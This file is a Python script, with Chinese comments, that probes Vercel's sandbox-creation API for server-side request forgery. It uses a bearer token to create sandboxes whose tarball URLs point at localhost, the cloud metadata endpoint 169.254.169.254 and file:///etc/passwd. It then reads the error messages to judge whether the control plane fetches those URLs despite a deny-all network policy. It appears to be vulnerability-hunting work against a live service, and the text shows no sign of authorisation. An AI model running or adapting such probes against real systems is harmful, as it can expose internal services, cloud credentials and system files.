# -*- coding: utf-8 -*-
"""v51b: source=tarball 拉取位置判定 + SSRF 探测
核心对照: networkPolicy deny-all 下创建带 tarball source 的 sandbox:
- 错误 "invalid gzip/not a tar" -> 下载成功 (拉取在控制面, 不受 guest 策略 -> SSRF 面!)
- 错误 "failed to download/network" -> 拉取在 guest (被 deny-all 拦) 或控制面失败
变体: 私有地址 127.0.0.1 / 169.254.169.254 / file:// 协议"""
import json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TOKEN, TEAM, PROJ

def api_raw(method, path, body=None, timeout=180):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:700]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:700]
    except Exception as e:
        return -1, 'EXC %s' % str(e)[:120]

def try_create(tag, name, url, np_mode=None, extra=None):
    body = {"projectId": PROJ, "name": name, "source": {"type": "tarball", "url": url}}
    if np_mode:
        body["networkPolicy"] = {"mode": np_mode}
    if extra:
        body.update(extra)
    c, r = api_raw('POST', '/v4/sandboxes?teamId=%s' % TEAM, body)
    print('[%s] -> %d %s' % (tag, c, (r or '')[:200]), flush=True)
    # 清理 (无论成功失败)
    api_raw('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    time.sleep(2)
    return c, r

if __name__ == '__main__':
    print('=== A1: deny-all + httpbin (下载方判定) ===', flush=True)
    try_create('A1', 'srctar51a', 'https://httpbin.org/anything')
    # 注意: A1 无 deny-all, 先测默认策略
    print('=== A2: deny-all + httpbin ===', flush=True)
    try_create('A2', 'srctar51b', 'https://httpbin.org/anything', np_mode='deny-all')
    print('=== A3: deny-all + 127.0.0.1:8080 ===', flush=True)
    try_create('A3', 'srctar51c', 'http://127.0.0.1:8080/t.tgz', np_mode='deny-all')
    print('=== A4: deny-all + 169.254.169.254 metadata ===', flush=True)
    try_create('A4', 'srctar51d', 'http://169.254.169.254/latest/meta-data/', np_mode='deny-all')
    print('=== A5: file:// 协议 ===', flush=True)
    try_create('A5', 'srctar51e', 'file:///etc/passwd', np_mode='deny-all')
    print('=== A6: allow-all + 127.0.0.1 (对照) ===', flush=True)
    try_create('A6', 'srctar51f', 'http://127.0.0.1:8080/t.tgz')
    print('=== A7: allow-all + 169.254.169.254 (对照) ===', flush=True)
    try_create('A7', 'srctar51g', 'http://169.254.169.254/latest/meta-data/')
    print('DONE', flush=True)
